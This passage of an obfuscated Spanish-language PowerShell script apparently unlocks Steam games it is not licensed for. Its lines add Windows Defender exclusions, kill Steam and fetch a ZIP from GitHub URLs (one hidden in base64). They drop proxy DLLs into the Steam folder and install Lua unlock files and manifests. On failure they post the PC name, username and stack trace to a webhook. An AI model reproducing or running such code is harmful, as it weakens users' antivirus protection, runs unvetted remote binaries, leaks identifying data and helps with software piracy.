    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    if ($url -match "github\.com.*/raw/|githubusercontent\.com|github\.com.*/releases/download/") {
        $dlUrl = $url; $cc = $null
    } else {
        $pageReq = [System.Net.HttpWebRequest]::Create($url)
        $pageReq.Method = "GET"; $pageReq.UserAgent = $ua; $pageReq.AllowAutoRedirect = $true
        $pageReq.Timeout = 30000; $pageReq.ReadWriteTimeout = 30000
        $pageReq.ServicePoint.Expect100Continue = $false; $pageReq.ServicePoint.UseNagleAlgorithm = $false
        $pageReq.ProtocolVersion = [System.Net.HttpVersion]::Version11; $pageReq.KeepAlive = $true
        $cc = New-Object System.Net.CookieContainer; $pageReq.CookieContainer = $cc
        $pageResp = $pageReq.GetResponse()
        $sr = New-Object System.IO.StreamReader $pageResp.GetResponseStream()
        $html = $sr.ReadToEnd()
        $sr.Close(); $pageResp.Close()
        $m = [regex]::Match($html, 'class="input\s+popsok"[^>]*href="([^"]+)"')
        if (-not $m.Success) { throw "No se pudo obtener el enlace de descarga de MediaFire." }
        $dlUrl = $m.Groups[1].Value
        $pageReq = $null; $pageResp = $null
    }
    [System.Net.ServicePointManager]::DefaultConnectionLimit = 128
    [System.Net.ServicePointManager]::Expect100Continue = $false
    $headReq = [System.Net.HttpWebRequest]::Create($dlUrl)
    $headReq.Method = "HEAD"; $headReq.UserAgent = $ua; $headReq.AllowAutoRedirect = $true
    $headReq.Timeout = 15000
    if ($cc) { $headReq.CookieContainer = $cc }
    $headResp = $headReq.GetResponse()
    $totalSize = $headResp.ContentLength
    $headResp.Close()
    if ($totalSize -le 0) {
        $dlReq2 = [System.Net.HttpWebRequest]::Create($dlUrl)
        $dlReq2.Method = "GET"; $dlReq2.UserAgent = $ua; $dlReq2.AllowAutoRedirect = $true
        $dlReq2.Timeout = 30000; $dlReq2.ReadWriteTimeout = 60000
        if ($cc) { $dlReq2.CookieContainer = $cc }
        $dlResp2 = $dlReq2.GetResponse()
        $totalSize = $dlResp2.ContentLength
        $str2 = $dlResp2.GetResponseStream(); $buf2 = New-Object byte[] 262144
        $fs2 = Safe-FileCreate $outFile; $tr = 0; $lp = -1
        try { while (($n2 = $str2.Read($buf2, 0, $buf2.Length)) -gt 0) { $fs2.Write($buf2, 0, $n2); $tr += $n2; if ($totalSize -gt 0 -and $progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $tr / $totalSize)); if ($pct -ne $lp) { $progressBar.Value = $pct; $lp = $pct; [System.Windows.Forms.Application]::DoEvents() } } else { [System.Windows.Forms.Application]::DoEvents() } } }
        finally { $str2.Close(); $fs2.Close(); $dlResp2.Close() }
        return
    }
    $connections = if ($totalSize -lt 5MB) { 4 } elseif ($totalSize -lt 20MB) { 8 } elseif ($totalSize -lt 100MB) { 16 } elseif ($totalSize -lt 500MB) { 24 } else { 32 }
    if ($connections -le 1) {
        $dlReq3 = [System.Net.HttpWebRequest]::Create($dlUrl)
        $dlReq3.Method = "GET"; $dlReq3.UserAgent = $ua; $dlReq3.AllowAutoRedirect = $true
        $dlReq3.Timeout = 120000; $dlReq3.ReadWriteTimeout = 120000
        $dlReq3.ServicePoint.Expect100Continue = $false; $dlReq3.ServicePoint.UseNagleAlgorithm = $false
        $dlReq3.ProtocolVersion = [System.Net.HttpVersion]::Version11; $dlReq3.KeepAlive = $true
        if ($cc) { $dlReq3.CookieContainer = $cc }
        $dlResp3 = $dlReq3.GetResponse()
        $str3 = $dlResp3.GetResponseStream(); $buf3 = New-Object byte[] 262144
        $fs3 = Safe-FileCreate $outFile; $tr3 = 0; $lp3 = -1
        try { while (($n3 = $str3.Read($buf3, 0, $buf3.Length)) -gt 0) { $fs3.Write($buf3, 0, $n3); $tr3 += $n3; if ($progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $tr3 / $totalSize)); if ($pct -ne $lp3) { $progressBar.Value = $pct; $lp3 = $pct; [System.Windows.Forms.Application]::DoEvents() } } else { [System.Windows.Forms.Application]::DoEvents() } } }
        finally { $str3.Close(); $fs3.Close(); $dlResp3.Close() }
        return
    }
    $chunkSize = [math]::Ceiling($totalSize / $connections)
    $tempDir = [System.IO.Path]::GetTempPath()
    $fileBase = [System.IO.Path]::GetFileNameWithoutExtension($outFile) + "_mfdl"
    $chunkFiles = @(); $runspaces = @(); $maxRetries = 3; $bufSize = 262144
    for ($i = 0; $i -lt $connections; $i++) {
        $start = $i * $chunkSize
        if ($start -ge $totalSize) { break }
        $end = [math]::Min($start + $chunkSize - 1, $totalSize - 1)
        $chunkFile = Join-Path $tempDir "${fileBase}_${i}.tmp"
        $chunkFiles += $chunkFile
        $cs = { param($u, $s, $e, $o, $ua2, $cc2, $bs, $mr)
            $le = $null
            for ($a = 1; $a -le $mr; $a++) {
                try {
                    $r = [System.Net.HttpWebRequest]::Create($u)
                    $r.Method = "GET"; $r.UserAgent = $ua2; $r.AllowAutoRedirect = $true
                    $r.Timeout = 120000; $r.ReadWriteTimeout = 120000
                    $r.ServicePoint.Expect100Continue = $false; $r.ServicePoint.UseNagleAlgorithm = $false
                    $r.ProtocolVersion = [System.Net.HttpVersion]::Version11; $r.KeepAlive = $true
                    if ($cc2) { $r.CookieContainer = $cc2 }
                    $r.AddRange($s, $e)
                    $rp = $r.GetResponse()
                    try { if (Test-Path -LiteralPath $o) { Remove-Item -LiteralPath $o -Force -ErrorAction SilentlyContinue } } catch {}
                    try { $d2=Split-Path $o -Parent; if ($d2 -and -not (Test-Path $d2)) { New-Item -ItemType Directory -Path $d2 -Force | Out-Null } } catch {}
                    $f = [System.IO.File]::Create($o)
                    $st = $rp.GetResponseStream(); $b = New-Object byte[] $bs
                    while (($nr = $st.Read($b, 0, $bs)) -gt 0) { $f.Write($b, 0, $nr) }
                    $f.Close(); $st.Close(); $rp.Close()
                    return
                } catch { $le = $_; if (Test-Path $o) { Remove-Item $o -Force -ErrorAction SilentlyContinue } }
            }
            throw "Chunk failed after $mr attempts: $le"
        }
        $ps = [powershell]::Create(); $rs = [RunspaceFactory]::CreateRunspace()
        $ps.Runspace = $rs; $rs.Open()
        [void]$ps.AddScript($cs).AddArgument($dlUrl).AddArgument([long]$start).AddArgument([long]$end).AddArgument($chunkFile).AddArgument($ua).AddArgument($cc).AddArgument($bufSize).AddArgument($maxRetries)
        $runspaces += @{ps=$ps;handle=$ps.BeginInvoke();file=$chunkFile;rs=$rs}
    }
    $chunkErrors = @(); $completed = 0; $totalChunks = $runspaces.Count
    foreach ($rs2 in $runspaces) {
        try { $rs2.ps.EndInvoke($rs2.handle); $completed++ }
        catch { $chunkErrors += "[$($rs2.file)] $($_.Exception.Message)" }
        $rs2.ps.Dispose(); $rs2.rs.Dispose()
        if ($progressBar) { $pct = $progressStart + [math]::Min($progressEnd, [math]::Round(($progressEnd - $progressStart) * $completed / $totalChunks)); $progressBar.Value = $pct; [System.Windows.Forms.Application]::DoEvents() }
    }
    if ($chunkErrors.Count -gt 0) {
        foreach ($cf in $chunkFiles) { if (Test-Path $cf) { Remove-Item $cf -Force -ErrorAction SilentlyContinue } }
        throw "Error en descarga segmentada: $($chunkErrors -join '; ')"
    }
    $fsOut = Safe-FileCreate $outFile
    $mergeBuf = New-Object byte[] 1048576
    foreach ($cf in $chunkFiles) {
        $fsIn = [System.IO.File]::OpenRead($cf)
        while (($nm = $fsIn.Read($mergeBuf, 0, $mergeBuf.Length)) -gt 0) { $fsOut.Write($mergeBuf, 0, $nm) }
        $fsIn.Close()
    }
    $fsOut.Close()
    foreach ($cf in $chunkFiles) { Remove-Item $cf -Force -ErrorAction SilentlyContinue }
    $actualSize = (Get-Item $outFile).Length
    if ($actualSize -ne $totalSize) {
        Remove-Item $outFile -Force -ErrorAction SilentlyContinue
        throw "TamaÃƒÂ±o incorrecto: $actualSize vs $totalSize"
    }
    if ($progressBar) { $progressBar.Value = $progressEnd; [System.Windows.Forms.Application]::DoEvents() }
}


function Extract-AndInstall {
    param([string]$zipPath, [string]$gameName = $null, $expirationDate = $null, [string]$code = $null)
    $steamRoot = Get-SteamPath
    $luaDir = Join-Path $steamRoot (S("Y29uZmlnXHN0cGx1Zy1pbg=="))
    $luaDir2 = Join-Path $steamRoot (S("Y29uZmlnXGx1YQ=="))
    $manifestDir = Join-Path $steamRoot "config\depotcache"
    $manifestDirRoot = Join-Path $steamRoot "depotcache"
    if (-not (Test-Path $luaDir)) { New-Item -ItemType Directory -Path $luaDir -Force | Out-Null }
    if (-not (Test-Path $luaDir2)) { New-Item -ItemType Directory -Path $luaDir2 -Force | Out-Null }
    if (-not (Test-Path $manifestDir)) { New-Item -ItemType Directory -Path $manifestDir -Force | Out-Null }
    if (-not (Test-Path $manifestDirRoot)) { New-Item -ItemType Directory -Path $manifestDirRoot -Force | Out-Null }
    $tempDir = Join-Path $env:TEMP "bsmap_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    $result = @{ lua = @(); manifest = @(); steamRoot = $steamRoot }
    try {
        Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
        $manifestNames = @(Get-ChildItem -Path $tempDir -Recurse -Filter *.manifest | ForEach-Object { $_.Name })
        if ($gameName -and $expirationDate) {
            $header = "-- BSMAP_EXPIRES:$($expirationDate.ToString('yyyy-MM-ddTHH:mm:ss'))`n-- BSMAP_GAME:$gameName`n"
            if ($manifestNames.Count -gt 0) { $header += "-- BSMAP_MANIFESTS:$($manifestNames -join ',')`n" }
            if ($code) { $header += "-- BSMAP_CODE:$code`n" }
            Get-ChildItem -Path $tempDir -Recurse -Filter *.lua | ForEach-Object {
                try { $c = [System.IO.File]::ReadAllText($_.FullName); [System.IO.File]::WriteAllText($_.FullName, $header + $c) } catch {}
            }
        }
        Get-ChildItem -Path $tempDir -Recurse -Filter *.lua | ForEach-Object { Copy-Item -Path $_.FullName -Destination $luaDir -Force; Copy-Item -Path $_.FullName -Destination $luaDir2 -Force; $result.lua += $_.Name }
        Get-ChildItem -Path $tempDir -Recurse -Filter *.manifest | ForEach-Object { Copy-Item -Path $_.FullName -Destination $manifestDir -Force; Copy-Item -Path $_.FullName -Destination $manifestDirRoot -Force; $result.manifest += $_.Name }
    } finally {
        Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    return $result
}


$WORKING_GAMES_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfd29ya2luZ19nYW1lcy5qc29u"))
$AUTO_FIXED_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfYXV0b19maXhlZC5qc29u"))
$FIX_MANIFEST_FILE = Join-Path $env:LOCALAPPDATA (S("YnNtYXBfZml4X21hbmlmZXN0Lmpzb24="))
$AUTO_FIX_EXCLUSIONS = @("resident evil 4", "re4")

function Ec8Tu {
    param([string]$s)
    $parts = @([regex]::Split($s, '(?<=[a-z])(?=[A-Z0-9])|(?<=[A-Z0-9])(?=[a-z])|[\s\._-]+') | Where-Object { $_ -and $_.Length -gt 0 })
    if ($parts.Count -le 1) { return $s }
    return ($parts | ForEach-Object { $_.ToLower() }) -join ' '
}

function Nn1Yw {
    param([string]$n)
    if ([string]::IsNullOrEmpty($n)) { return '' }
    try {
        $n = $n.Normalize([System.Text.NormalizationForm]::FormD)
        $n = [regex]::Replace($n, '\p{Mn}', '')
    } catch {}
    return ($n -replace '[^a-z0-9 ]', '').ToLower().Trim()
}

function Gl9Dz {
    param([string]$a, [string]$b)
    $n = $a.Length; $m = $b.Length
    if ($n -eq 0) { return $m }; if ($m -eq 0) { return $n }
    $prev = New-Object int[] ($m + 1)
    $curr = New-Object int[] ($m + 1)
    for ($j = 0; $j -le $m; $j++) { $prev[$j] = $j }
    for ($i = 1; $i -le $n; $i++) {
        $curr[0] = $i
        for ($j = 1; $j -le $m; $j++) {
            $cost = if ($a[$i-1] -ceq $b[$j-1]) { 0 } else { 1 }
            $del = $prev[$j] + 1; $ins = $curr[$j-1] + 1; $sub = $prev[$j-1] + $cost
            $min = $del; if ($ins -lt $min) { $min = $ins }; if ($sub -lt $min) { $min = $sub }
            $curr[$j] = $min
        }
        $tmp = $prev; $prev = $curr; $curr = $tmp
    }
    return $prev[$m]
}

function Ff2Xa {
    param([string]$gameFolderName, [hashtable]$fixes)
    if ($fixes.ContainsKey($gameFolderName)) { return $gameFolderName, $fixes[$gameFolderName] }
    $gfn = Nn1Yw $gameFolderName
    $gfnExpanded = Nn1Yw (Ec8Tu $gameFolderName)
    $bestFix = $null; $bestUrl = $null; $bestScore = 0
    foreach ($f in $fixes.Keys) {
        $ffn = Nn1Yw $f
        $ffnExpanded = Nn1Yw (Ec8Tu $f)
        if ($ffn -eq $gfn) { return $f, $fixes[$f] }
        if ($ffnExpanded -eq $gfnExpanded) { return $f, $fixes[$f] }
        $useGfn = $gfnExpanded; $useFfn = $ffnExpanded
        $maxLen = [Math]::Max($useFfn.Length, $useGfn.Length)
        $minLen = [Math]::Min($useFfn.Length, $useGfn.Length)
        if ($useFfn -like "*$useGfn*" -or $useGfn -like "*$useFfn*") {
            $shorter = if ($useFfn.Length -le $useGfn.Length) { $useFfn } else { $useGfn }
            $longer = if ($useFfn.Length -gt $useGfn.Length) { $useFfn } else { $useGfn }
            $isPrefix = $longer.StartsWith($shorter) -and $longer.Length -gt $shorter.Length
            $extraLen = if ($isPrefix) { $longer.Length - $shorter.Length } else { 0 }
            if ($isPrefix -and $extraLen -ge [Math]::Floor($shorter.Length * 0.3)) { }
            elseif ($minLen -ge $maxLen * 0.4) { $s = $maxLen; if ($s -gt $bestScore) { $bestScore = $s; $bestFix = $f; $bestUrl = $fixes[$f] } }
            elseif ($shorter -notmatch '\s' -and $longer.EndsWith($shorter)) { $s = $maxLen; if ($s -gt $bestScore) { $bestScore = $s; $bestFix = $f; $bestUrl = $fixes[$f] } }
        }
    }
    return $bestFix, $bestUrl
}

function Apply-FixAutomatically {
    param([string]$gameFolderName, [string]$gamePath, [hashtable]$fixes)
    $fixName, $fixUrl = Ff2Xa $gameFolderName $fixes
    if (-not $fixUrl) { return $false, "No hay reparacion disponible para $gameFolderName" }
    $zip = Join-Path $env:TEMP "auto_$(Get-Random).zip"
    try {
        Bn6Lc $fixUrl $zip
        $extractedRelative = @()
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
            $z = [System.IO.Compression.ZipFile]::OpenRead($zip)
            foreach ($entry in $z.Entries) { if ($entry.Name) { $extractedRelative += $entry.FullName } }
            $z.Dispose()
        } catch {}
        Expand-Archive -Path $zip -DestinationPath $gamePath -Force
        if ($extractedRelative.Count -gt 0) { Am3Fs $gameFolderName $gamePath $extractedRelative }
        Aw8Nq $gameFolderName
        Add-AutoFixedGame $gameFolderName
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        return $true, "Reparacion '$fixName' aplicada correctamente a $gameFolderName"
    } catch {
        Remove-Item $zip -Force -ErrorAction SilentlyContinue
        return $false, "Error al aplicar reparacion en $gameFolderName : $($_.Exception.Message)"
    }
}

function Get-WorkingGames {
    if (Test-Path $WORKING_GAMES_FILE) {
        try { $r = @(Get-Content $WORKING_GAMES_FILE -Raw | ConvertFrom-Json); return ,$r } catch {}
    }
    return @()
}

function Aw8Nq {
    param([string]$gameFolderName)
    $games = @(Get-WorkingGames)
    if ($games -notcontains $gameFolderName) { $games += $gameFolderName; $games | ConvertTo-Json | Set-Content $WORKING_GAMES_FILE -Force }
}

function Get-AutoFixedGames {
    if (Test-Path $AUTO_FIXED_FILE) {
        try { $list = @(Get-Content $AUTO_FIXED_FILE -Raw | ConvertFrom-Json); $r = @($list | Where-Object { -not (Should-ExcludeFromAutoFix $_) }); return ,$r } catch {}
    }
    return @()
}

function Add-AutoFixedGame {
    param([string]$gameFolderName)
    if (Should-ExcludeFromAutoFix $gameFolderName) { return }
    $games = @(Get-AutoFixedGames)
    if ($games -notcontains $gameFolderName) { $games += $gameFolderName; $games | ConvertTo-Json | Set-Content $AUTO_FIXED_FILE -Force }
}

function Should-ExcludeFromAutoFix {
    param([string]$gameName)
    $norm = Nn1Yw $gameName
    foreach ($ex in $AUTO_FIX_EXCLUSIONS) {
        if ($norm -match [regex]::Escape($ex)) { return $true }
        if ($norm -eq $ex) { return $true }
    }
    return $false
}

function Get-FixManifest {
    if (Test-Path $FIX_MANIFEST_FILE) { try { $r = @(Get-Content $FIX_MANIFEST_FILE -Raw | ConvertFrom-Json); return ,$r } catch {} }
    return @()
}

function Save-FixManifest {
    param([array]$manifest)
    $manifest | ConvertTo-Json | Set-Content $FIX_MANIFEST_FILE -Force
}

function Test-FixApplied {
    param([string]$gameName)
    $manifest = Get-FixManifest
    $entry = $manifest | Where-Object { $_ -is [PSCustomObject] -and $_.game -eq $gameName }
    if (-not $entry) { return $false }
    if (-not ($entry.game_root -and (Test-Path $entry.game_root))) { return $false }
    $allExist = $true
    foreach ($f in $entry.files) { $fp = Join-Path $entry.game_root $f; if (-not (Test-Path $fp)) { $allExist = $false; break } }
    return $allExist
}

function Am3Fs {
    param([string]$gameName, [string]$gameRoot, [string[]]$newFiles)
    $manifest = Get-FixManifest
    $manifest = $manifest | Where-Object { $_ -is [PSCustomObject] -and $_.game -ne $gameName }
    $entry = [PSCustomObject]@{ game = $gameName; game_root = $gameRoot; files = @($newFiles) }
    $manifest += $entry
    Save-FixManifest $manifest
}


$script:ParcheDllHash=@{
    'dwmapi.dll'='5b9e0e2067a4a948d68d0a35dc6910ac24574c32f22e9db938db789febc81a63';
    'OpenSteamTool.dll'='b2ed24e0b4e2d0dae4caa8817ed4c0c34af8fdf056f356fd697ae1356ea22581';
    'xinput1_4.dll'='96fe0a6a6176703028ff674298de3ebd8f89f6f22a242db5587c66d51d1a9ac4'
}
function Test-ParcheActual {
    param([string]$root)
    if (-not $root) { return $false }
    foreach($k in $script:ParcheDllHash.Keys) {
        $p=Join-Path $root $k
        if (-not (Test-Path $p)) { return $false }
        try { $h=(Get-FileHash $p -Algorithm SHA256).Hash.ToLower(); if ($h -ne $script:ParcheDllHash[$k]) { return $false } } catch { return $false }
    }
    return $true
}
function Xz9Qk {
    param([switch]$Silent)
    try {
        $srChk=$null; try { $srChk=Get-SteamPath } catch {}
        if (Test-ParcheActual $srChk) {
            try { Set-ParcheInstalado $true } catch {}
            return $true
        }
    } catch {}
    $attempt=0
    while ($attempt -lt 3) {
        $attempt++
        try {
            $steamRoot = Get-SteamPath
            Add-SteamDefenderExclusions | Out-Null
            Add-DefenderExclusion $steamRoot | Out-Null
            Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force
            Start-SleepDoEvents 2000
            $urls=@((D "aHR0cHM6Ly9naXRodWIuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vcmF3L21haW4vUEFSQ0hFTkVXdy56aXA="),"https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/PARCHENEWw.zip","https://cdn.jsdelivr.net/gh/bastisayes/Fixes-steam@main/PARCHENEWw.zip")
            $data=$null; $dlErr=""
            foreach ($u in $urls) {
                try { $wc2=New-Object System.Net.WebClient; $data=$wc2.DownloadData($u); if ($data -and $data.Length -gt 1000) { break } } catch { $dlErr=$_.Exception.Message }
                try { $tmp2=Join-Path $env:TEMP "patch_dl_$(Get-Random).zip"; Invoke-WebRequest -Uri $u -OutFile $tmp2 -UseBasicParsing -TimeoutSec 30; $data=[IO.File]::ReadAllBytes($tmp2); Remove-Item $tmp2 -Force -ErrorAction SilentlyContinue; if ($data.Length -gt 1000) { break } } catch { $dlErr=$_.Exception.Message }
                try { $tmp3=Join-Path $env:TEMP "patch_curl_$(Get-Random).zip"; $null=& curl.exe -sL --ssl-no-revoke -o "$tmp3" "$u" --max-time 30 2>&1; if ((Test-Path $tmp3) -and ((Get-Item $tmp3).Length -gt 1000)) { $data=[IO.File]::ReadAllBytes($tmp3); Remove-Item $tmp3 -Force -ErrorAction SilentlyContinue; break } } catch { $dlErr=$_.Exception.Message }
            }
            if (-not $data -or $data.Length -lt 1000) { throw "Descarga parche fallo tras 3 URLs: $dlErr" }
            $tmpZip = Join-Path $env:TEMP "patch_$(Get-Random).zip"
            [System.IO.File]::WriteAllBytes($tmpZip, $data)
            $extracted=$false
            try { Expand-Archive -Path $tmpZip -DestinationPath $steamRoot -Force -ErrorAction Stop; $extracted=$true } catch {
                try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue; [System.IO.Compression.ZipFile]::ExtractToDirectory($tmpZip, $steamRoot, $true); $extracted=$true } catch { $extracted=$false }
            }
            Remove-Item -LiteralPath $tmpZip -Force -ErrorAction SilentlyContinue
            if ($extracted) {
                $okDll = (Test-Path (Join-Path $steamRoot "OpenSteamTool.dll")) -and (Test-Path (Join-Path $steamRoot "xinput1_4.dll"))
                if ($okDll) {
                    if (Test-Path (Join-Path $steamRoot (S("c3RlYW0uZXhl")))) { try { Start-Process (Join-Path $steamRoot (S("c3RlYW0uZXhl"))) } catch {} }
                    elseif (-not $Silent) { [System.Windows.Forms.MessageBox]::Show("No se pudo abrir Steam, abrelo manualmente.", "Aviso", "OK", "Warning") }
                    Set-ParcheInstalado $true
                    return $true
                }
            }
            if ($attempt -ge 3) { throw "No se verifico instalacion de dlls tras 3 intentos" }
            Start-SleepDoEvents 1000
        } catch {
            if ($attempt -ge 3) {
                WEL (S("QWN0aXZhciBEaXJlY3Rv")) $_
                try {
                    $sr2=$null; try { $sr2=Get-SteamPath } catch {}
                    $has1=$false; $has2=$false; try { $has1=Test-Path (Join-Path $sr2 "OpenSteamTool.dll"); $has2=Test-Path (Join-Path $sr2 "xinput1_4.dll") } catch {}
                    $bt=[char]96
                    $msg="**PATCH FAIL (Xz9Qk)** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Steam:** $sr2`n**dll:** $has1/$has2`n**Error:** $($_.Exception.Message)`n$bt$bt$bt$($_.ScriptStackTrace)$bt$bt$bt"
                    $pl=@{content=$msg}|ConvertTo-Json
                    Invoke-BgNoWait ({ param($u,$p) try { Invoke-RestMethod -Uri $u -Method Post -Body $p -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {} }) @($WEBHOOK_URL,$pl)
                } catch {}
                if (-not $Silent) { [System.Windows.Forms.MessageBox]::Show("No se pudo reparar la activacion. Verifica tu conexion o revisa el log.","Solucionar activacion","OK","Error") }
                return $false
            }
            Start-SleepDoEvents 1000
        }
    }
    try {
        $sr3=$null; try { $sr3=Get-SteamPath } catch {}
        $has1b=$false; $has2b=$false; try { $has1b=Test-Path (Join-Path $sr3 "OpenSteamTool.dll"); $has2b=Test-Path (Join-Path $sr3 "xinput1_4.dll") } catch {}
        $bt2=[char]96
        $msg2="**PATCH FAIL (Xz9Qk)** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME`n**Steam:** $sr3`n**dll:** $has1b/$has2b`n**Error:** No se verifico dlls tras 3 intentos`n$bt2$bt2$bt2 no dll $bt2$bt2$bt2"
        $pl2=@{content=$msg2}|ConvertTo-Json
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $pl2 -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    } catch {}
    return $false
}


function Get-ParcheInstalado {
    try { $v = (Get-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("UGFyY2hlSW5zdGFsYWRv")) -ErrorAction SilentlyContinue).ParcheInstalado; if ($null -ne $v) { return ([int]$v -eq 1) } } catch {}
    try { $f = Join-Path $env:LOCALAPPDATA (S('YnNtYXBfcGFyY2hlLmZsYWc=')); if (Test-Path $f) { return ((Get-Content $f -Raw).Trim()) -eq "1" } } catch {}
    return $false
}
function Set-ParcheInstalado {
    param([bool]$on)
    try { New-Item -Path "HKCU:\Software\Bsmap" -Force -ErrorAction SilentlyContinue | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name (S("UGFyY2hlSW5zdGFsYWRv")) -Value $(if ($on) { 1 } else { 0 }) -Type DWord -Force -ErrorAction SilentlyContinue; [System.IO.File]::WriteAllText((Join-Path $env:LOCALAPPDATA (S('YnNtYXBfcGFyY2hlLmZsYWc='))), $(if ($on) { "1" } else { "0" }), $script:utf8NoBom) } catch {}
}


function Get-InstallFolderMap {
    if ($script:INSTALL_FOLDER_MAP) { return $script:INSTALL_FOLDER_MAP }
    $instMap = @{}
    foreach ($lib in Ss3Jd) {
        $appsDir = Join-Path $lib (S("c3RlYW1hcHBz"))
        if (-not (Test-Path -LiteralPath $appsDir)) { continue }
        Get-ChildItem -LiteralPath $appsDir -Filter 'appmanifest_*.acf' -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $txt = Get-Content -LiteralPath $_.FullName -Raw -ErrorAction SilentlyContinue
                if (-not $txt) { return }
                $mApp = [regex]::Match($txt, '"appid"\s+"(\d+)"')
                $mDir = [regex]::Match($txt, '"installdir"\s+"([^"]+)"')
                if ($mApp.Success -and $mDir.Success) {
                    $aid = $mApp.Groups[1].Value
                    $dir = $mDir.Groups[1].Value
                    if ($aid -and $dir -and -not $instMap.ContainsKey($aid)) { $instMap[$aid] = $dir }
                }
            } catch {}
        }
    }
    $script:INSTALL_FOLDER_MAP = $instMap
    return $instMap
}


function Qw7Rt {
    try {
        $wc = New-Object System.Net.WebClient
        $jsonText = $wc.DownloadString((D "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vbWFpbi9maXhlc19saXN0Lmpzb24="))
        $wc.Dispose()
        $parsed = $jsonText | ConvertFrom-Json
        $fixes = @{}
        foreach ($f in @($parsed)) {
            if (-not $f -or -not $f.filename) { continue }
            $name = $f.filename -replace '\.zip$', ''
            $url = (D "aHR0cHM6Ly9naXRodWIuY29tL2Jhc3Rpc2F5ZXMvRml4ZXMtc3RlYW0vcmVsZWFzZXMvZG93bmxvYWQvYmFzdGlzc3Mv") + $f.filename
            $fixes[$name] = $url
            if ($f.game -and $f.game.Trim().Length -gt 0 -and -not $fixes.ContainsKey($f.game)) { $fixes[$f.game] = $url }
        }
        try {
            $instM = Get-InstallFolderMap
            foreach ($gKey in @($fixes.Keys)) {
                $fixAppid = Find-AppIdByName $gKey
                if (-not $fixAppid) { continue }
                $fixAppid = [string]$fixAppid
                if ($instM.ContainsKey($fixAppid)) {
                    $fixFolder = $instM[$fixAppid]
                    if ($fixFolder -and -not $fixes.ContainsKey($fixFolder)) { $fixes[$fixFolder] = $fixes[$gKey] }
                }
            }
        } catch {}
        return $fixes
    } catch { return @{} }
}

function Ii5Hb {
    $games = @{}
    foreach ($lib in Ss3Jd) {
        $common = Join-Path $lib (S("c3RlYW1hcHBzXGNvbW1vbg=="))
        if (Test-Path $common) {
            Get-ChildItem -LiteralPath $common -Directory -ErrorAction SilentlyContinue | ForEach-Object { $games[$_.Name] = $_.FullName }
        }
    }
    return $games
}

function Ss3Jd {
    $steamRoot = Get-SteamPath
    $libs = @($steamRoot)
    $vdf = Join-Path $steamRoot (S("c3RlYW1hcHBzXGxpYnJhcnlmb2xkZXJzLnZkZg=="))
    if (Test-Path $vdf) {
        $v = Get-Content $vdf -Raw -ErrorAction SilentlyContinue
        [regex]::Matches($v, '"path"\s+"([^"]+)"') | ForEach-Object { $p = $_.Groups[1].Value; if (Test-Path $p) { $libs += $p } }
    }
    return $libs | Select-Object -Unique
}

function Repair-Manifests {
    param([string]$appid)
    $sbBase="https://raw.githubusercontent.com/SPIN0ZAi/SB_manifest_DB"
    $steamRoot=$null; try { $steamRoot=Get-SteamPath } catch {}
    if (-not $steamRoot) { return @{ok=$false; err="No se encontro Steam"} }
    $luaDir=Join-Path $steamRoot "config\stplug-in"
    $luaDir2=Join-Path $steamRoot "config\lua"
    $manDir=Join-Path $steamRoot "config\depotcache"
    foreach ($d in @($luaDir,$luaDir2,$manDir)) { if (-not (Test-Path -LiteralPath $d)) { try { New-Item -ItemType Directory -Path $d -Force | Out-Null } catch {} } }
    $tmp=Join-Path $env:TEMP "sb_repair_$(Get-Random)"
    try { New-Item -ItemType Directory -Path $tmp -Force | Out-Null } catch { return @{ok=$false; err="No se pudo crear carpeta temporal"} }
    $luaOk=$false; $manCount=0; $errs=@()
    try {
        try {
            Invoke-WebRequest -Uri "$sbBase/$appid/$appid.lua" -OutFile (Join-Path $tmp "$appid.lua") -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
            $txt=Get-Content (Join-Path $tmp "$appid.lua") -Raw
            if ($txt -match "setManifestid") { $luaOk=$true } else { $errs+="lua sin setManifestid" }
        } catch { $errs+="lua: "+$_.Exception.Message }
        if ($luaOk) {
            try { Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir "$appid.lua") -Force; Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir2 "$appid.lua") -Force } catch { $errs+="copiar lua: "+$_.Exception.Message }
        }
        $ids=@()
        try { $ids=@([regex]::Matches($txt,'setManifestid\((\d+),\s*"(\d+)"') | ForEach-Object { "$($_.Groups[1].Value)_$($_.Groups[2].Value).manifest" }) | Select-Object -Unique } catch {}
        foreach ($m in $ids) {
            try {
                Invoke-WebRequest -Uri "$sbBase/$appid/$m" -OutFile (Join-Path $tmp $m) -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
